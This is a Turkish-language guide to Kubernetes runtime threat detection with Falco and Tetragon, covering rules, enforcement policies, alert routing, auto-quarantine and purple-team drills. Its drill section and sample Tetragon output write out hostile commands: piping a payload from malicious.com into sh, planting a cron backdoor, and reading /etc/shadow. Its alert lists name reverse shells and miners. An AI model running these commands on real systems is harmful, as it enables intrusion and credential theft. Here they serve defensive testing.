# Runtime Security — Falco, Tetragon, eBPF

> *"Build-time tarama duvarı yapar; runtime detection **alarmı çalan
> dedektör**. İkisi olmadan, ihlali öğrendiğin an müşterinin
> tweet'i."*

Bu rehber bir Kubernetes cluster'ında runtime'da kötü davranışı tespit
etmenin modern yolunu gösterir: Falco (rule-based), Tetragon (eBPF
native), ve nasıl alarm → eylem zinciri kurulur.

---

## 🎯 Runtime Security Niye Lazım?

```
       │
   ┌───▼────┐                         ┌──────────┐
   │ Build  │  CVE'siz, signed image  │ Admission│  Verify, deploy.
   │  scan  │  →→→→→→→→→→→→→→→→→→→→→→ │  policy  │
   └────────┘                         └────┬─────┘
                                           │
                                           ▼
                                  ┌─────────────────┐
                                  │   Pod running   │
                                  │                 │
                                  │  Container içi  │  ← burası kör nokta
                                  │  ne yapıyor?    │
                                  └─────────────────┘
                                           │
                                  Runtime detection
                                  Falco / Tetragon
                                  ▼
                              Alert + auto-response
```

Build-time taramaları geçmiş bir image bile **runtime'da kötü davranabilir**:
- Compromised dependency (npm package supply-chain attack)
- Zero-day exploitation
- Insider script
- Lateral movement (compromised pod → diğerleri)

> 🔑 **Pratik kural:** Production cluster'ında **detection olmadan** çalıştığın
> her saat, ihlal halinde **görmeden geçen** zamandır.

---

## ⚖️ Falco vs Tetragon

| Özellik | **Falco** | **Tetragon** |
|---|---|---|
| **Tip** | Rule-based runtime detector | eBPF native observability + enforcement |
| **Veri kaynağı** | Kernel events (syscalls, k8s audit) | eBPF programs (raw kernel) |
| **Yaş** | 2016 (CNCF Graduated) | 2022 (CNCF Incubating, Cilium ekosistemi) |
| **Performans** | İyi, ama syscall hooking maliyeti var | Mükemmel, eBPF düşük overhead |
| **Enforcement** | Sadece detect, alarm | Detect + **kill / block** (eBPF in-kernel) |
| **Setup** | DaemonSet | DaemonSet, Cilium varsa entegre |
| **Rule DSL** | YAML + custom expression | TracingPolicy (CRD) |
| **Topluluk** | Geniş, eski rule katalogları | Yeni, Cilium ekibi aktif |
| **Best for** | Hızlı başla, çok hazır rule | Cilium kullanıyorsun, performans kritik |

> 🔑 **Pratik öneri:** Falco öğrenme eğrisi düşük, kütüphane geniş, **çoğu
> kurum için başla**. Cilium kullanıyorsan veya scale çok büyükse Tetragon.
> İkisini birlikte de kullanabilirsin (overlap kabul edilebilir).

---

## 🛠️ Falco Kurulumu

```bash
helm install falco falcosecurity/falco \
  -n falco --create-namespace \
  --set driver.kind=modern_ebpf \
  --set tty=true \
  --set falcosidekick.enabled=true \
  --set falcosidekick.webui.enabled=true \
  --set falcoctl.config.indexes[0].name=falcosecurity \
  --set falcoctl.config.indexes[0].url=https://falcosecurity.github.io/falcoctl/index.yaml
```

**Driver seçimi:**
- ✅ `modern_ebpf` (kernel 5.8+) — önerilen
- ⚠️ `ebpf` (eski eBPF) — fallback
- ❌ `kernel module` — kernel başına derleme, kullanma

### Falco-sidekick: alert routing
Falco alarmları çıkarır → falco-sidekick → Slack/PagerDuty/SIEM/Webhook.

```yaml
# values.yaml (sidekick)
falcosidekick:
  config:
    slack:
      webhookurl: "https://hooks.slack.com/services/<...>"
      channel: "#security-alerts"
      minimumpriority: warning
    pagerduty:
      routingkey: "<KEY>"
      minimumpriority: critical
    elasticsearch:
      hostport: "https://<ES_HOST>:9200"
      index: falco
```

---

## 📜 Falco Rule Anatomi

### Built-in örnek
```yaml
- rule: Terminal shell in container
  desc: Container içinde interactive shell başlatıldı
  condition: >
    spawned_process and container
    and shell_procs and proc.tty != 0
    and container_entrypoint
    and not user_expected_terminal_shell_in_container_conditions
  output: >
    A shell was spawned in a container with an attached terminal
    (user=%user.name container=%container.name image=%container.image.repository
     proc=%proc.name parent=%proc.pname cmdline=%proc.cmdline)
  priority: NOTICE
  tags: [container, shell, mitre_execution]
```

### Custom rule yazma
```yaml
# /etc/falco/rules.d/custom-rules.yaml

- rule: Outbound connection to unexpected destination
  desc: Container internet'e beklenmedik IP'ye konuşuyor
  condition: >
    outbound and container
    and not fd.sip in (allowed_outbound_ips)
    and not fd.sip in (k8s_dns_servers)
  output: >
    Suspicious outbound connection (container=%container.name
     dest_ip=%fd.sip dest_port=%fd.sport)
  priority: WARNING
  tags: [network, mitre_command_and_control]


- list: allowed_outbound_ips
  items: ["10.0.0.0/8", "172.16.0.0/12"]


- rule: Write to /etc in container
  desc: Container içinde /etc'ye yazma anomalidir
  condition: >
    open_write and container
    and fd.name startswith /etc
    and not proc.name in (allowed_etc_writers)
  output: >
    Write to /etc detected (container=%container.name
     file=%fd.name proc=%proc.name)
  priority: ERROR
  tags: [filesystem, mitre_persistence]
```

---

## 🚨 "İlk Gün" Alarm Seti

Production cluster'a girer girmez aşağıdaki alarmlar **ilk hafta** açılmalı:

| Alarm | Tehdit |
|---|---|
| Shell in container | Saldırgan exec yapıyor |
| Write below /etc | Persistence mechanism |
| Read sensitive file (`/etc/shadow`, `/etc/kubernetes/admin.conf`) | Credential dump |
| Privileged operation by non-admin | Privilege escalation |
| Outbound to suspicious IP | C2 callback |
| Container drift (image hash changed) | Image substitution |
| K8s ServiceAccount token mounted in unexpected pod | Lateral movement |
| Kubectl exec from outside | Insider abuse |
| Cryptomining process (xmrig, ccminer signatures) | Resource abuse |
| Reverse shell pattern | Command injection |

### MITRE ATT&CK mapping
Her rule'a `mitre_*` tag'i ekle → SIEM'de tactic/technique bazında raporla:
```yaml
tags: [container, shell, mitre_execution, T1059]
```

---

## 🛡️ Tetragon — eBPF ile Detect + Enforce

### Kurulum
```bash
helm install cilium cilium/cilium \
  -n kube-system \
  --set tetragon.enabled=true

# veya standalone
helm install tetragon cilium/tetragon \
  -n kube-system
```

### TracingPolicy: shell process'i kill
```yaml
apiVersion: cilium.io/v1alpha1
kind: TracingPolicy
metadata:
  name: kill-shells-in-prod
spec:
  kprobes:
    - call: "sys_execve"
      syscall: true
      args:
        - index: 0
          type: "string"
      selectors:
        - matchArgs:
            - index: 0
              operator: "Equal"
              values:
                - "/bin/bash"
                - "/bin/sh"
                - "/bin/zsh"
          matchActions:
            - action: Sigkill
```

> 🔑 Tetragon **kill** yapabilir — kernel-space'te SIGKILL gönderir, syscall
> tamamlanmaz. Falco sadece raporlar.

### Process tree gözlemi
```bash
kubectl exec -n kube-system <TETRAGON_POD> -c tetragon -- \
  tetra getevents -o compact

# Çıktı:
# 🚀 process default/api-pod /usr/bin/curl http://malicious.com/payload
# 🛑 sigkill default/api-pod /usr/bin/curl http://malicious.com/payload
```

---

## 🔄 Detection → Response Otomasyonu

### Falco → Falcosidekick → Action
```yaml
# falcosidekick config
outputs:
  - type: webhook
    url: "https://<RESPONSE_API>/quarantine-pod"
    minimumpriority: critical
```

### Response service (örnek): pod'u network'ten kopart
```python
# response-service.py (FastAPI)
from fastapi import FastAPI
from kubernetes import client, config

config.load_incluster_config()
app = FastAPI()

@app.post("/quarantine-pod")
def quarantine(alert: dict):
    pod = alert["output_fields"]["k8s.pod.name"]
    namespace = alert["output_fields"]["k8s.ns.name"]

    # Pod'a quarantine label ekle
    api = client.CoreV1Api()
    body = {"metadata": {"labels": {"quarantine": "true"}}}
    api.patch_namespaced_pod(pod, namespace, body)

    # Ayrı bir NetworkPolicy bu label'i tüm trafikten izole eder
    return {"status": "quarantined", "pod": pod}
```

### Quarantine NetworkPolicy
```yaml
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: quarantined-pods
  namespace: <NS>
spec:
  podSelector:
    matchLabels:
      quarantine: "true"
  policyTypes: [Ingress, Egress]
  # ingress / egress yok → tüm trafik kesilir
```

> ⚠️ **Auto-response dikkatli:** False positive → prod servisi koparma riski.
> Aşamalı: önce sadece ALERT, 1 ay sonra "soft action" (label), 3 ay sonra
> aggressive action (kill pod).

---

## 📊 SIEM Entegrasyonu

Falco/Tetragon eventleri **mutlaka** merkezi log'a:

| SIEM / Log | Output plugin |
|---|---|
| Wazuh | Falcosidekick syslog plugin |
| Loki + Grafana | Falcosidekick loki plugin |
| Splunk | HTTP Event Collector (HEC) |
| Elastic | Elasticsearch output |
| Datadog | Datadog API |
| Sumo Logic | HTTP webhook |

### Wazuh ile entegrasyon (TR'de yaygın)
```yaml
# falcosidekick values
falcosidekick:
  config:
    syslog:
      host: "<WAZUH_MANAGER>"
      port: 514
      protocol: tcp
      format: json
```

```xml
<!-- /var/ossec/etc/decoders.d/falco_decoders.xml -->
<decoder name="falco">
  <prematch>^{"output":</prematch>
  <plugin_decoder>JSON_Decoder</plugin_decoder>
</decoder>
```

Bkz: [`Network/Network Segmentation and Wazuh SIEM Integration Guide.md`](../Network/Network%20Segmentation%20and%20Wazuh%20SIEM%20Integration%20Guide.md).

---

## 📈 Ölçüm: Detection Effectiveness

### KPI'lar
| Metrik | Hedef |
|---|---|
| MTTD (Mean Time To Detect) | < 5 dakika |
| False positive rate | < 5% |
| Coverage (MITRE technique) | %70+ critical technique |
| Alert volume | < 10/gün/cluster (insan inceleyebilsin) |
| Tatbikat (purple team) frekansı | Quarterly |

### Detection coverage matrix
MITRE ATT&CK her technique için Falco rule'unu eşleştir:

| Tactic | Technique | Rule |
|---|---|---|
| Initial Access | T1190 (exploit public app) | "Suspicious outbound" |
| Execution | T1059 (command interpreter) | "Shell in container" |
| Persistence | T1505 (server software comp.) | "Write below /etc" |
| Privilege Escalation | T1068 (kernel exploit) | "Setuid file accessed" |
| Defense Evasion | T1140 (deobfuscate) | "Base64 + curl pattern" |
| Credential Access | T1003 (OS creds) | "Read /etc/shadow" |
| Discovery | T1018 (remote system) | "kubectl get nodes from pod" |
| Lateral Movement | T1021 (remote services) | "SSH from container" |
| Exfiltration | T1041 (C2 channel) | "Outbound to non-internal IP" |

---

## 🚫 Anti-Pattern Tablosu

| Anti-pattern | Niye kötü | Doğru |
|---|---|---|
| Sadece Falco install, rule custom yok | Default rule'lar yeterli değil | İlk hafta 10+ custom rule |
| Alert sadece Slack'e | Volume büyür, ekip ignore eder | SIEM'e + dedup + severity routing |
| Auto-response ilk gün aggressive | False positive prod kapatır | Aşamalı: Alert → Label → Kill |
| `priority: ERROR` her şey | Önemli olan kayıp gider | NOTICE / WARN / ERROR / CRITICAL ayır |
| MITRE mapping yok | Coverage gap görünmez | Her rule MITRE technique'e bağlı |
| Falco crash, kimsenin haberi yok | Detection sessiz çöker | Falco kendisi monitor edilir |
| Test/CI'da Falco yok | Yeni feature unintended pattern getirir | E2E testte de Falco aktif |
| Tatbikat yok | "İşliyor" sadece varsayım | Quarterly purple team tatbikatı |

---

## 🎯 Tatbikat: Purple Team Drill

### Senaryo: "Compromised pod"
```bash
# Red team (saldırı simülasyonu)
kubectl exec -it <POD> -- /bin/bash
# içerde:
curl http://malicious.com/payload | sh
echo "evil" > /etc/cron.daily/backdoor
cat /etc/shadow
```

### Beklenen alarmlar (Falco)
- ✅ "Shell in container"
- ✅ "Suspicious outbound"
- ✅ "Write below /etc"
- ✅ "Read sensitive file"

### Skor
- Hangi alarmlar çaldı?
- MTTD?
- IC sürecine girdi mi?
- Hangi ek kontrol gerekli?

> Quarterly tatbikat → her seferinde gap kapanır, ekip refleksi gelişir.

---

## 📋 Runtime Security Checklist

```
[ ] Falco veya Tetragon (ya da ikisi) tüm cluster'larda kurulu
[ ] modern_ebpf driver (kernel 5.8+)
[ ] Falcosidekick → SIEM (Wazuh / Loki / Splunk)
[ ] İlk hafta 10+ custom rule (yukarıdaki listeden)
[ ] MITRE ATT&CK mapping yapılmış
[ ] Severity routing: WARN → Slack, ERROR → Slack + ticket, CRITICAL → PagerDuty
[ ] False positive < 5%, alert hygiene quarterly review
[ ] Auto-response politikası: aşamalı (Alert → Label → Kill)
[ ] Quarantine NetworkPolicy hazır
[ ] Quarterly purple team tatbikatı
[ ] MTTD ölçülüyor, hedef < 5 dk
[ ] Falco/Tetragon kendi pod'ları monitor ediliyor (meta-monitoring)
[ ] CI/E2E test ortamında Falco aktif (regresyon yakala)
[ ] Coverage matrix güncel (MITRE technique x rule)
```

---

## 📚 Referanslar

- **Falco** — falco.org
- **Falco Rules Repository** — github.com/falcosecurity/rules
- **Falcosidekick** — github.com/falcosecurity/falcosidekick
- **Tetragon** — tetragon.io
- **eBPF.io** — ebpf.io
- **MITRE ATT&CK for Containers** — attack.mitre.org/matrices/enterprise/containers/
- [`Kubernetes-Hardening.md`](Kubernetes-Hardening.md)
- [`Threat-Modeling.md`](Threat-Modeling.md) — coverage matrix sahibi
- [`11-SRE/Incident-Response.md`](../11-SRE/Incident-Response.md) — alert → IR akışı
- [`Network/Network Segmentation and Wazuh SIEM Integration Guide.md`](../Network/Network%20Segmentation%20and%20Wazuh%20SIEM%20Integration%20Guide.md)

---

> *"Build duvarı yapar; runtime **kapı zilini çalar**. Saldırgan
> eninde sonunda duvarı aşar; kapı zilin çalmazsa, içerde olduğunu
> öğrenmek için **müşterinin tweet**'ini bekliyorsun demektir."*
